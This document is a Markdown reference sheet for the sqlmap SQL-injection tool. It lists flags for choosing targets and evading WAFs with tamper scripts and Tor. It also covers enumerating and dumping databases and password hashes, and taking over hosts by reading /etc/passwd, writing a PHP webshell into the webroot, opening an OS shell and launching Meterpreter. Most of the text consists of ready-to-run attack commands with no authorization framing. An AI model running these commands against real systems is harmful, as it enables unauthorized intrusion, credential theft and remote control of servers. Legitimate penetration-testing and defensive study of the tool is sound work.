# sqlmap — full working reference

## Target specification

| Flag | Meaning |
|---|---|
| `-u "https://192.0.2.10/item.php?id=1"` | Single URL (quote it; `&` breaks shells) |
| `-r request.txt` | Raw HTTP request file saved from the proxy — carries cookies, auth headers, body. Preferred for anything authenticated or non-GET. |
| `--force-ssl` | Use HTTPS with `-r` (the raw file has no scheme) |
| `-m urls.txt` | Multiple targets, one URL per line |
| `-g "inurl:php?id="` | Google-dork targets |
| `--data='id=1&cat=2'` | POST body (also accepts JSON/XML — sqlmap detects and injects into values) |
| `-c sqlmap.conf` | Options from INI file |

JSON APIs: `--data='{"id":"1","name":"a"}'` with `-H "Content-Type: application/json"`;
sqlmap injects into each JSON value. For GraphQL or odd formats, mark the point with `*`.

### Injection-point selection

- `-p id,cat` — test only these parameters; `--skip=token,csrf` — skip these.
- `*` marker — inject exactly here: `-u "https://192.0.2.10/user/1*/edit"`,
  `--data='{"id":"1*"}'`, or inside a header/cookie value in the `-r` file.
- `--param-del=';'` — nonstandard parameter delimiter.
- `--cookie="PHPSESSID=abc; role=user"` — cookies (tested at `--level>=2`); `--cookie-del`.
- `-H "X-Api-Key: ..."` / `--headers="X-A: 1\nX-B: 2"` — extra headers.
- `--level>=3` adds `User-Agent`/`Referer`; `--level=5` adds `Host`.
- `--method=PUT` to force a verb with `-u`.

## Detection tuning

| Flag | Effect |
|---|---|
| `--batch` | Never prompt; take default answers. **Required for unattended runs.** |
| `--level=1..5` | More inputs + more payload boundaries. 1 default; 2 cookies; 3 UA/Referer; 5 everything. |
| `--risk=1..3` | 1 default; 2 adds heavy time-based; 3 adds OR-based payloads (can corrupt data inside UPDATE statements — know your target query). |
| `--technique=BEUSTQ` | B boolean-blind, E error-based, U UNION, S stacked, T time-blind, Q inline query. Subset to focus (`--technique=T` for pure blind); **must contain `S` for `--os-shell`/`--os-cmd`.** |
| `--dbms=mysql` | Skip fingerprinting (mysql, postgresql, mssql, oracle, sqlite, mariadb, ...). `--dbms="mysql 5.7"` pins version. |
| `--os=linux\|windows` | Backend OS hint |
| `--string="Welcome"` / `--not-string="Error"` | Anchor boolean TRUE/FALSE detection on a body string when auto-diff is flaky (dynamic pages) |
| `--regexp`, `--code=200` | Alternative TRUE anchors |
| `--text-only` / `--titles` | Compare only text / only `<title>` |
| `--time-sec=5` | Delay used by time-based payloads (raise on jittery links) |
| `--union-cols=6-12`, `--union-char=123`, `--union-from=dual` | UNION tuning |
| `--invalid-bignum`, `--invalid-logical` | Alternate ways to invalidate the original value |
| `--prefix="')" --suffix="-- -"` | Force injection boundaries when you already know the context |
| `--second-url=https://192.0.2.10/view` / `--second-req=req2.txt` | Second-order: payload lands via request 1, result read from request 2 |

## Requests / evasion / session

| Flag | Effect |
|---|---|
| `--proxy=http://127.0.0.1:8080` | Route via intercepting proxy (`--proxy-cred=user:pass`) |
| `--tor --tor-type=SOCKS5 --check-tor` | Tor routing |
| `--random-agent` | Random browser User-Agent (many WAFs block the default `sqlmap/x.y`) |
| `--delay=1`, `--timeout=30`, `--retries=3` | Pacing |
| `--threads=10` | Parallel requests (big speedup for blind; max 10) |
| `--tamper="between,randomcase"` | Payload-transform scripts, comma-separated, **no spaces**, applied in order |
| `--chunked` | Chunked transfer-encoding on POST (defeats some body inspection) |
| `--hpp` | HTTP parameter pollution |
| `--safe-url` / `--safe-freq=10` | Hit a benign URL every N requests (keeps sessions alive / avoids lockout) |
| `--csrf-token=csrf --csrf-url=...` | Auto-refresh anti-CSRF token each request |
| `--auth-type=basic\|digest\|ntlm --auth-cred=user:pass` | HTTP auth |
| `--flush-session` | Discard cached session results and retest |
| `--fresh-queries` | Keep session but re-run enumeration queries |

### Useful tamper scripts

| Script | Transform | Good against |
|---|---|---|
| `between` | `>` → `NOT BETWEEN 0 AND`, `=` → `BETWEEN n AND n` | Filters on `<>=` |
| `randomcase` | `SELECT` → `SeLeCt` | Keyword-case filters |
| `space2comment` | space → `/**/` | Space filters (generic) |
| `space2plus`, `space2randomblank` | space → `+` / odd whitespace | URL contexts |
| `charencode` / `chardoubleencode` | URL-encode / double-encode payload | Decode-once WAFs |
| `equaltolike` | `=` → `LIKE` | `=` filters (MySQL/MSSQL) |
| `greatest` | `>` → `GREATEST(...)` | MySQL `>` filters |
| `ifnull2ifisnull` | `IFNULL` → `IF(ISNULL(...))` | MySQL |
| `modsecurityversioned` / `versionedkeywords` | wrap in `/*!00000...*/` | ModSecurity, MySQL only |
| `percentage` | `%S%E%L%E%C%T` | ASP/IIS |
| `apostrophemask` | `'` → UTF-8 fullwidth | Quote filters |
| `base64encode` | whole payload base64 | Params decoded server-side |
| `hex2char`, `symboliclogical`, `space2mssqlblank`, `space2mysqlblank` | DBMS-specific | — |

Starter combos: generic `--tamper="between,randomcase"`; MySQL+ModSecurity
`--tamper="between,randomcase,space2comment,modsecurityversioned"`; MSSQL
`--tamper="between,charencode,space2mssqlblank"`. Check `--list-tampers` for the full set and
confirm current spellings with `sqlmap --list-tampers`.

## Enumeration

Order: fingerprint → databases → tables → columns → dump → secrets.

```
--banner --current-user --current-db --hostname --is-dba
--users --passwords            # DBMS accounts + password hashes (feeds hashcat)
--privileges --roles
--dbs                          # list databases
--tables -D appdb              # tables in appdb
--columns -T users -D appdb    # columns + types
--schema --exclude-sysdbs      # whole schema at once
--count -T users -D appdb      # row count before committing to a dump
--dump -D appdb -T users -C username,password,email
--dump --start=1 --stop=100    # row-range limit
--dump-all --exclude-sysdbs    # everything (slow; only when the objective demands it)
--search -C passw              # find columns LIKE %passw% anywhere
--sql-query="SELECT @@version"
--sql-shell                    # interactive SQL over the injection
```

Dumped hashes: sqlmap offers dictionary cracking inline (`--batch` auto-declines; answer the
prompt or export hashes). `--common-tables`/`--common-columns` brute-force names on DBMSes
without information_schema (e.g. MySQL < 5, Access).

## Output & machine-readable results

- Default output tree: `~/.local/share/sqlmap/output/<host>/` containing:
  - `log` — full text log incl. the `Parameter: ... / Type / Title / Payload` blocks and
    `back-end DBMS:` lines (what `parse_sqlmap.py` reads),
  - `session.sqlite` — resumable hashdb (keys are hashed; parse `log`, not this),
  - `target.txt` — target URL + original command line,
  - `dump/<db>/<table>.csv` — dumped data.
- `--output-dir=./sqlmap-out` relocates the tree (one subdir per host).
- `--results-file=results.csv` — CSV: `Target URL,Place,Parameter,Technique(s),Note(s)`
  (techniques as letters BEUSTQ).
- `--dump-format=CSV|HTML|SQLITE|JSONL` — dump file format. JSONL is best for pipelines;
  SQLITE collects all dumps into one queryable db.
- Verbosity: `-v 3` shows injected payloads, `-v 4` full HTTP requests, `-v 5` responses —
  use `-v 4` when you need request/response evidence in the log. `-t traffic.txt` records
  all HTTP traffic.

## Takeover: files and OS commands

| Flag | Requirement | Notes |
|---|---|---|
| `--file-read=/etc/passwd` | MySQL `FILE` priv / PG superuser / MSSQL sysadmin | Saved under output dir `files/` |
| `--file-write=local --file-dest=/var/www/html/s.php` | Same + writable path | Classic webshell drop on MySQL (`INTO OUTFILE`) |
| `--os-cmd="id"` | Stacked queries (`S`) + DBA-ish privileges | One-shot command |
| `--os-shell` | Same | Interactive. MySQL/PG: asks web app language + writable webroot, uploads a stager; MSSQL: `xp_cmdshell` (re-enables via `sp_configure` if DBA) |
| `--os-pwn` | Same + metasploit installed | Meterpreter via memory/stager |
| `--priv-esc`, `--reg-read/--reg-add` | Windows targets | Registry access via MSSQL |

Prereq checklist for `--os-shell`: injection confirmed with technique `S` in the log,
`--is-dba` → True (or MySQL `FILE` priv in `--privileges`), known/guessable webroot for
MySQL/PG stager upload. If `S` was never found injectable, os-shell will not work — fall back
to `--file-write` of a webshell or OOB exfil.

## Auto-discovery

```
sqlmap -u "https://192.0.2.10/" --crawl=3 --forms --batch --output-dir=./sqlmap-out --results-file=./results.csv
```

`--crawl=N` spiders N levels from the start URL; `--forms` parses and tests every form found;
`--crawl-exclude="logout"` protects sessions. Combine with `--level=2 --risk=1` for a broad
first pass, then re-run deep (`--level=5 --risk=3 --technique=BEUSTQ`) against hits from
`results.csv`.
